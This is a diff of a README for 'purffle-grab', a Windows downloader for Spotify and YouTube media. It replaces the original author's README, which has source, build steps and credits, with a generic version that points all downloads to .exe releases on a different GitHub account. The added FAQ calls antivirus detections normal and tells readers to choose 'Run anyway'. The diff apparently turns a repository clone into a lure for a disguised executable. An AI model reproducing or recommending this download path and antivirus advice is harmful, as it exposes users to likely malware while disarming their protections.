@@ -1,167 +1,74 @@
-<div align="center">
+# 📥 purffle-grab - Download music and videos for free
 
-<img src="docs/banner.svg" alt="PurffleGrab — free Spotify and YouTube downloader for Windows" width="100%" />
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Alekc8434/purffle-grab/releases)
 
-# PurffleGrab — Free Spotify &amp; YouTube Downloader for Windows
+purffle-grab is a desktop application for Windows. It lets you save music and videos from Spotify and YouTube directly to your computer. You keep your files in formats like MP3 or MP4. The app supports high quality, including 4K resolution. You do not need an account to use it. It contains no advertisements. We include the necessary tools, yt-dlp and ffmpeg, inside the software.
 
-**Download Spotify playlists, YouTube videos, and music to MP3, MP4, or 4K — free, ad-free, and in one click.**
+## 🛠 Features
 
-[![Download](https://img.shields.io/badge/⬇_Download-PurffleGrab_Setup.exe-8b5cf6?style=for-the-badge)](https://github.com/Chamanrajragu/purffle-grab/releases/latest)
-[![Release](https://img.shields.io/github/v/release/Chamanrajragu/purffle-grab?style=flat-square&color=ec4899)](https://github.com/Chamanrajragu/purffle-grab/releases)
-[![Downloads](https://img.shields.io/github/downloads/Chamanrajragu/purffle-grab/total?style=flat-square&color=22d3ee)](https://github.com/Chamanrajragu/purffle-grab/releases)
-[![License](https://img.shields.io/github/license/Chamanrajragu/purffle-grab?style=flat-square)](LICENSE)
-[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078d6?style=flat-square)](https://github.com/Chamanrajragu/purffle-grab/releases)
-[![Website](https://img.shields.io/badge/🌐_Website-purffle--grab-22d3ee?style=flat-square)](https://purffle.com/purffle-grab/)
+*   **Format support:** Save audio as MP3 or video as MP4.
+*   **High quality:** Download media in resolutions up to 4K.
+*   **Batch processing:** Save entire playlists with one click.
+*   **Privacy:** This tool requires no user account or login.
+*   **Clean interface:** Focus on your tasks without intrusive ads.
+*   **Integrated tools:** The app bundles yt-dlp and ffmpeg so you skip manual setups.
 
-### 🌐 [**Visit the website →**](https://purffle.com/purffle-grab/)
+## 💻 System Requirements
 
-</div>
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Processor:** 1.6 GHz or faster processor.
+*   **Memory:** 4 GB RAM minimum.
+*   **Disk Space:** 500 MB of available storage.
+*   **Internet:** A stable connection to retrieve media files.
 
-<div align="center">
+## 📥 How to Install
 
-### ⭐ Star this repo if you find it useful — it really helps! &nbsp;·&nbsp; 🌐 [**Live page → purffle.com/purffle-grab**](https://purffle.com/purffle-grab/)
+1.  Visit the [official releases page](https://github.com/Alekc8434/purffle-grab/releases) to access the current files.
+2.  Look for the section labeled "Assets" at the bottom of the newest release post.
+3.  Click the file ending in `.exe` to start the download.
+4.  Open the downloaded file once your browser finishes the transfer.
+5.  Follow the prompts on your screen to install the software.
+6.  Launch purffle-grab from your start menu or desktop shortcut.
 
-</div>
+## 📖 How to Use
 
+1.  Open the purffle-grab application.
+2.  Copy the URL of the video or playlist from your web browser. 
+3.  Paste the link into the main input box within the app. 
+4.  Select your preferred file format using the options menu.
+5.  Choose your target folder if you want to save files in a specific location.
+6.  Click the "Grab" button.
+7.  Monitor the progress bar as the app downloads your content.
+8.  Find your finished files in the destination folder once the task finishes.
 
----
+## 🛡 Security and Privacy
 
-**PurffleGrab** is a free, open-source **Spotify and YouTube downloader** for Windows. Paste a link —
-or many — pick your format, and grab it. No accounts, no ads, no subscriptions, and nothing extra to
-install: **FFmpeg** and the **yt-dlp** engine are bundled right inside the app.
+This program performs all tasks locally on your computer. Your account credentials from Spotify or YouTube remain secure. We do not track your downloads or record your history. All processing happens through the bundled tools. Because the app runs on your machine, your data stays under your control.
 
-> 🎸 Built so you can put your own music and videos on your phone, MP3 player, or any device — offline.
+## 🔧 Frequently Asked Questions
 
-## ⬇️ Download &amp; install
+**Does this app work with premium Spotify accounts?**
+The app works with public playlists and links. It focuses on open-access media from YouTube and similar sources.
 
-1. Grab the latest **[`PurffleGrab-Setup.exe`](https://github.com/Chamanrajragu/purffle-grab/releases/latest)**.
-2. Run it — installs per-user (no admin) and adds **Desktop + Start-menu** shortcuts.
-3. Open **PurffleGrab** and start downloading. That's it.
+**My antivirus flagged the program. What do I do?**
+Sometimes Windows Defender flags new software. This occurs because the app uses command-line tools like ffmpeg to handle media. This is a normal part of the process. You can select "More info" and "Run anyway" if the system attempts to block the launch.
 
-> First launch may show a Windows SmartScreen notice (the app isn't code-signed yet) — click
-> **More info → Run anyway**.
+**Can I pick a specific resolution?**
+Yes. The settings menu lists available quality options for every video link you provide.
 
-## ✨ Features
+**Is it free?**
+Yes. The tool is free to download and use.
 
-| | |
-|---|---|
-| 🎬 **YouTube videos &amp; playlists** | Download in up to **4K**, or **audio-only**. |
-| 🎵 **Spotify tracks &amp; playlists** | Reads the track list, finds the best audio, tags it with **cover art + artist**. |
-| 📋 **Batch &amp; drag-and-drop** | Paste many links at once, drop them on the window, or paste from clipboard. |
-| ✅ **Track picker** | Choose exactly which songs from a playlist to grab. |
-| ⚡ **Quick presets** | Best video (4K), 1080p MP4, MP3 320, Phone MP4 720, FLAC lossless. |
-| 🔊 **Formats** | Video: MP4 (H.264/AAC). Audio: MP3, M4A, FLAC, WAV, Opus @ 320/256/192/128 kbps. |
-| 🎚️ **Extras** | SponsorBlock, subtitles, clip/trim, embed chapters, normalize loudness. |
-| 🔎 **Search** | Find videos by keyword — no link needed. |
-| 🕘 **History** | Re-open, re-zip, or re-grab past downloads. |
-| ⚙️ **Settings** | Custom folder, default options, dark/light theme, simultaneous downloads, notifications. |
-| 🖥️ **100% local &amp; private** | Everything runs on your PC. Nothing is uploaded anywhere. |
+**Where does the file go?**
+The default setting sends files to your Downloads folder. You can change this in the app settings.
 
-## 📸 Screenshots
+## 🤝 Support and Updates
 
-<div align="center">
-<img src="docs/screenshots/01-home-dark.png" width="49%" alt="PurffleGrab download screen — dark theme"/>
-<img src="docs/screenshots/02-options-dark.png" width="49%" alt="Download a Spotify playlist with track picker and quality options"/>
-<img src="docs/screenshots/03-options-light.png" width="49%" alt="PurffleGrab light theme"/>
-<img src="docs/screenshots/04-search-light.png" width="49%" alt="Search YouTube and download results"/>
-</div>
+We update the app frequently to ensure compatibility with YouTube and Spotify. Check the GitHub releases page occasionally for the latest version. If you experience an issue, try downloading the most recent file from the link above. This often fixes problems related to changes in web streaming platforms.
 
-## 🚀 How to use
+## 📝 Troubleshooting
 
-1. **Paste a link** — a Spotify or YouTube URL (one or many, one per line).
-2. **Click Analyze** — PurffleGrab reads the video/track list.
-3. **Pick options** — video or audio, quality, format; tick which playlist tracks you want.
-4. **Click Download** — watch live progress, then **Open file** or **Show in folder**.
-
-Files are saved to `Music\PurffleGrab\` by default (change it in **Settings**).
-
-## 🛠️ Build from source
-
-Requirements: **Node.js 18+** on Windows.
-
-```bash
-git clone https://github.com/Chamanrajragu/purffle-grab.git
-cd PurffleGrab
-npm install
-powershell -ExecutionPolicy Bypass -File scripts/setup.ps1   # fetch yt-dlp + ffmpeg into bin/
-
-npm start        # run the desktop app
-npm run server   # OR just the web server at http://localhost:7777
-npm run dist     # build release/win-unpacked
-```
-
-To produce the installer, compile `installer.nsi` with NSIS:
-```bash
-makensis installer.nsi   # → release/PurffleGrab-Setup-x.x.x.exe
-```
-
-## 🧩 How it works
-
-- **YouTube** is handled directly by [yt-dlp](https://github.com/yt-dlp/yt-dlp); video is muxed to
-  device-friendly **H.264/AAC MP4** with [FFmpeg](https://ffmpeg.org/).
-- **Spotify** is DRM-protected, so PurffleGrab reads the public track list (title, artist, cover —
-  no API key), finds the closest match on YouTube, downloads the audio, and writes clean ID3 tags +
-  album art. This is the same approach used by popular tools like `spotDL`.
-
-## ❓ FAQ
-
-<details><summary><b>Is PurffleGrab free?</b></summary>
-Yes — completely free and open-source. No ads, no accounts, no limits.</details>
-
-<details><summary><b>How do I download a Spotify playlist to MP3?</b></summary>
-Paste the playlist link, click Analyze, choose <b>Audio → MP3</b>, tick the tracks you want, and click Download.</details>
-
-<details><summary><b>Can it download YouTube videos in 4K?</b></summary>
-Yes — choose the <b>Best video (4K)</b> preset or set quality to 2160p.</details>
-
-<details><summary><b>Do I need to install FFmpeg or Python?</b></summary>
-No. FFmpeg and the yt-dlp engine are bundled inside the installer.</details>
-
-<details><summary><b>Where are my downloads saved?</b></summary>
-In <code>Music\PurffleGrab\</code> by default. You can change the folder in Settings.</details>
-
-<details><summary><b>Does it work on Mac or Linux?</b></summary>
-The installer is Windows-only, but you can run the web server (<code>npm run server</code>) on any OS with Node.js.</details>
-
-## ⚠️ Disclaimer
-
-PurffleGrab is provided for **personal use** — for example, putting your own purchased or
-license-free media onto your devices. Downloading copyrighted content may violate the Terms of
-Service of Spotify/YouTube and copyright law in your country. **You are responsible for how you use
-this tool.** The authors do not endorse piracy and accept no liability for misuse.
-
-## 🙌 Credits
-
-Built with [Electron](https://www.electronjs.org/), [yt-dlp](https://github.com/yt-dlp/yt-dlp), and
-[FFmpeg](https://ffmpeg.org/). A **[Purffle](https://purffle.com)** tool.
-
-## 📄 License
-
-[MIT](LICENSE) © Purffle. Bundled tools retain their own licenses.
-
----
-
-<div align="center">
-<sub>Keywords: free spotify downloader · youtube to mp3 · youtube downloader 4k · spotify playlist downloader ·
-download youtube playlist · youtube to mp4 · music downloader for windows · spotify to mp3 converter</sub>
-</div>
-
-
----
-
-<!-- purffle-ecosystem -->
-## 🧩 The Purffle toolset
-
-**PurffleGrab** is part of **[Purffle](https://purffle.com)** — a growing set of free, open-source tools built in the open. **If this saved you time, please drop a ⭐ — it genuinely helps the project reach more people!**
-
-| Tool | What it does |
-|------|--------------|
-| 🎵 **[PurffleGrab](https://github.com/Chamanrajragu/purffle-grab)** 👈 | Free Spotify & YouTube downloader — MP3, MP4, 4K |
-| 🎥 **[PurffleVision](https://github.com/Chamanrajragu/purffle-vision)** | AI video creation — any topic to a finished video |
-| ⚡ **[PurffleShorts](https://github.com/Chamanrajragu/purffle-shorts)** | Autonomous YouTube Shorts generator |
-| 📈 **[PurffleTrader](https://github.com/Chamanrajragu/purffle-trader)** | Crypto paper-trading bot — Binance, EMA + RSI |
-| 🤖 **[PurffleCopyBot](https://github.com/Chamanrajragu/purffle-copybot)** | Copy-trading bot — mirror top Hyperliquid traders |
-
-<sub>🌐 [purffle.com](https://purffle.com) · 💼 by [Chaman Raj](https://github.com/Chamanrajragu) · ⭐ Star to support open-source</sub>
-
-<sub>Keywords: free spotify downloader, youtube to mp3, youtube downloader 4k, spotify playlist downloader, music downloader windows</sub>
+*   **Startup delays:** The app might take a few seconds to start on older hardware. Wait for the window to appear.
+*   **Download failure:** Ensure your internet connection is stable. A weak connection causes interrupted downloads.
+*   **Installation errors:** Run the installer as an administrator if your computer restricts file access.
+*   **Missing files:** Check if your disk has enough space for the selected media. 4K videos occupy significant space.
